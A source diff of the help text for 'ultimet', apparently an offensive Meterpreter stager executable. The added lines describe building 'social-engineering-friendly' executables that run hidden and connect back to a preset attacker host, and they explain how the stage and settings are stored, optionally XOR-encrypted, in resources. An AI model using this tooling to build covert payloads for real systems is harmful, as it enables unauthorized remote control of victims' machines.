@@ -146,9 +146,9 @@ bool UnicodeToAnsi(char* ascii, const wchar_t* unicode)
 
 void print_header()
 {
-	printf("\n\n****************************************************\n");
-	printf(" [+] [ultimet] - The Ultimate Meterpreter Executable\n");
-	printf(" [+] v0.2\n");
+	printf("****************************************************\n");
+	printf("[+] [ultimet] - The Ultimate Meterpreter Executable\n");
+	printf("[+] v0.3 - #25Jan Revolution  \n");
 	printf("****************************************************\n");
 	printf("  -  http://eldeeb.net - @SheriefEldeeb\n\n");
 }
@@ -157,33 +157,62 @@ void usage()
 {
 	printf(
 		"Usage:\n"
-		"utlimet.exe -h <LHOST> -p <LPORT> -t <TRANSPORT> [-f FILENAME] \n"
+		"utlimet.exe -h <LHOST> -p <LPORT> -t <TRANSPORT> [-f FILENAME] [--msfpayload]\n"
+		"                                                 [--remove-stage] [--reset] \n"
 
-		"\nMandatory switches:\n"
+		"\nConnection settings:\n"
 		"\t-h\tLHOST\tIP or a hostname.\n"
 		"\t-p\tLPORT\tPort number.\"\n"
-		"\t-t\tTRANSPORT\t\"reverse_tcp\", \"reverse_metsvc\", \"reverse_http\", \"reverse_https\", \"bind_tcp\" or \"bind_metsvc\""
+		"\t-t\tTRANSPORT \"reverse_tcp\", \"reverse_metsvc\", \"reverse_http\", \"reverse_https\",\n\t\t\t  \"bind_tcp\" or \"bind_metsvc\"\n"
 
-		"\nHTTP(S) Specific parameters:\n"
+		"\nHTTP(S) Specific settings `optional`:\n"
 		"\t-ua\tU_AGENT\t User-Agent, enclose in `\"\"` if contains spaces.\n"
 		"\t-et\tSECONDS\t Session expiration timeout in seconds.\n"
-		"\t-ct\tSECONDS\t Communication expiration timeout in seconds.\n\n"
+		"\t-ct\tSECONDS\t Communication expiration timeout in seconds.\n"
 
-		"Stage loading options:\n"
+		"\nCreating social-engineering-friendly exe files with `built-in` settings \"i.e. msfpayload-like exe\":\n"
+		"\t--msfpayload\tWhen this is specified along with the connection parameters, a new exe will be\n"
+		"\t\t\tcreated with the following naming convention: TRANSPORT-LHOST-LPORT.exe, \n"
+		"\t\t\tthis newly created exe will execute silently according to the predefined settings.\n"
+		"\t\t\t ... it's gonna be just like the exe files you get out of msfpayload.\n"
+		"\t--reset\t\tA new exe will be created `ultimet_reset.exe` with pre-defined\n"
+		"\t        \tsettings cleared `anti --msfpayload`.\n"
+		
+		"\nStage options:\n"
 		"\t-f\tFILE\tForces loading the stage from a file.\n"
 		"\t\t\tNote: The file can be a regular metsrv.dll,\n"
 		"\t\t\tor an encrypted one using the ultimet_xor.exe utility.\n"
+		"\t--remove-stage\tCreates a new exe `ultimet_no_stage.exe` with stage resource removed,\n"
+		"\t\t\tit will resut in smaller file, but metsvc family of payloads won't be available.\n"
+		"\t\t\tTo re-attach the resource ... use a resource editor.\n"
 
-		"\n - If you're on a shell [not a console], you have to start the program using:\n"
-		"  \"start /b ultimet.exe ...\" or you'll lose your shell.\n"
-		"\n - For the reverse_metsvc & bind_metsvc options, stage has to be available\n"
+		"\nGeneral notes:\n"
+		" - If you find the console window disappears immediatly when you run ultimet, this\n"
+		"   means it found valid connection settings built-in, to get rid of this behaviour,\n"
+		"   run `ultimet.exe --reset` and you'll get a new pristine `ultimet_reset.exe`.\n"
+		" - The exe file created with `--msfpayload` option is a fully functional ultimet.exe,\n"
+		"   but it will run hidden and doesn't require connection parameters to be specified since\n"
+		"   they're preconfigured, to reset that exe to its norm, just specify `--reset` and a fresh\n"
+		"   exe will be created with default settings.\n"
+		" - If you're on a shell [not a console], you have to start the program using:\n"
+		"   \"start /b ultimet.exe ...\" or you'll lose your shell.\n"
+		" - For the reverse_metsvc & bind_metsvc options, stage has to be available\n"
 		"   upfront, either through the bundled resource or loaded usng the \"-f\" option\n"
-		"\n[+] note that the most reliable handler for reverse_metsvc is:\n\n"
-		"  \"windows/metsvc_reverse_tcp\" ... using reverse_metsvc to connect to a \"reverse_tcp\" *might* work,\n"
-		"  but not always, so, use reverse_metsvc with windows/metsvc_reverse_tcp... ok?\n"
-		"\nand also for bind_metsvc:\n"
+		" - The most reliable handler for reverse_metsvc is:\n"
+		"   \"windows/metsvc_reverse_tcp\" ... using reverse_metsvc to connect to a \"reverse_tcp\" *might* work,\n"
+		"   but not always, so, use reverse_metsvc with windows/metsvc_reverse_tcp.\n"
+		" - Same applies to bind_metsvc:\n"
 		"  \"windows/metsvc_bind_tcp\" ... using bind_metsvc to connect to a \"bind_tcp\" *might* work,\n"
-		"  but not always, so, use bind_metsvc with windows/metsvc_metsvc_tcp...\n"
+		"   but not always, so, use bind_metsvc with windows/metsvc_metsvc_tcp...\n"
+
+		"\nAdvanced notes:\n"
+		" - ultimet utilizes resources to include the stage, and to store connection settings internally.\n"
+		" - The stage `metsvc.dll` is stored in a resource `BINARY` and ID `101`,\n"
+		"   stage can be the plain metsvc.dll file or encrypted using ultimet_xor.exe utility.\n"
+		" - Options are stored in a resource `BINARY` and ID `103` using the following convention:\n"
+		"   |UM|TRANSPORT|LHOST|LPORT|\n"
+		" - You can use your favourite resource editor to create/edit those resources as you please.\n"
+
 		"\nContributors:\n"
 		" - Anwar Mohamed \"@anwarelmakrahy\" - Added support for metsvc_bind_tcp & bind_tcp.\n"
 
